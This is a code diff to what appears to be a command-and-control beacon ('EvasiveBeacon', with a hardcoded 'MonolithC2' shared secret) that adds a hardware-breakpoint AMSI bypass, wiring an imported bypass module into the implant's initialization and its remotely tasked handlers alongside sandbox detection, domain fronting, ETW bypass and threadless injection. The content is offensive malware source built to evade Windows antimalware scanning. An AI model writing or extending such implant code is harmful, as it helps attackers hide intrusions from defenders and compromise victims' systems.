@@ -44,6 +44,18 @@ try:
     from evasion.anti_sandbox import SandboxDetector
     from evasion.traffic_masking import TrafficMasker, DomainFronter
     from evasion.amsi_bypass import AMSIBypass, ETWBypass
+    try:
+        from evasion.hwbp_amsi_bypass import (
+            HWBPAMSIBypass,
+            get_hwbp_amsi_bypass,
+            enable_amsi_hwbp,
+            disable_amsi_hwbp,
+            is_amsi_hwbp_active,
+        )
+        HWBP_AVAILABLE = True
+    except ImportError:
+        HWBP_AVAILABLE = False
+        HWBPAMSIBypass = None
     EVASION_AVAILABLE = True
 except ImportError:
     EVASION_AVAILABLE = False
@@ -769,6 +781,16 @@ class EvasiveBeacon:
             shared_secret="MonolithC2TransientSecret2026",
         )
 
+        # NEW: Initialize HWBP AMSI bypass engine
+        self.hwbp_amsi = None
+        if HWBP_AVAILABLE:
+            try:
+                self.hwbp_amsi = get_hwbp_amsi_bypass()
+                print("[+] HWBP AMSI bypass engine initialized")
+            except Exception as e:
+                print(f"[!] Failed to initialize HWBP AMSI bypass: {e}")
+                self.hwbp_amsi = None
+
         # NEW: Initialize syscall obfuscation engine
         self.syscall_obfuscator = None
         if SYSCALL_OBFUSCATOR_AVAILABLE and config.enable_syscall_obfuscation:
@@ -847,6 +869,7 @@ class EvasiveBeacon:
             "threadless": self._handle_threadless,  # NEW
             "heap_mask": self._handle_heap_mask,  # NEW
             "network_cloak": self._handle_network_cloak,  # NEW
+            "amsi_hwbp": self._handle_amsi_hwbp,  # NEW: HWBP AMSI bypass
             "report": self._handle_report,  # NEW: Report generation handler
             "mimicry": self._handle_mimicry,  # NEW: Behavioral mimicry handler
             "quantum": self._handle_quantum,  # NEW: Quantum crypto handler
@@ -2217,6 +2240,42 @@ class EvasiveBeacon:
             return "Network cloak: no action provided"
         except Exception as e:
             return f"Network cloak error: {e}"
+    
+    def _handle_amsi_hwbp(self, task: Dict) -> str:
+        """
+        Hardware Breakpoint AMSI bypass.
+        No memory patching - uses CPU debug registers + VEH.
+        """
+        if not self.hwbp_amsi:
+            return "HWBP AMSI bypass failed: engine not available"
+
+        action = task.get('action', 'enable')
+
+        try:
+            if action == 'enable':
+                result = self.hwbp_amsi.enable()
+                if result.success:
+                    return json.dumps({
+                        "status": "enabled",
+                        "amsi_address": f"0x{result.amsi_addr:016X}",
+                        "technique": "hardware_breakpoint",
+                    })
+                return f"HWBP enable failed: {result.error}"
+
+            elif action == 'disable':
+                result = self.hwbp_amsi.disable()
+                return json.dumps({
+                    "status": "disabled" if result.success else "failed",
+                    "error": result.error,
+                })
+
+            elif action == 'status':
+                status = self.hwbp_amsi.get_status()
+                return json.dumps(status)
+
+            return "HWBP AMSI: unknown action"
+        except Exception as e:
+            return f"HWBP AMSI error: {e}"
     
     def get_injection_status(self) -> Dict[str, Any]:
         """Get injection engine status"""
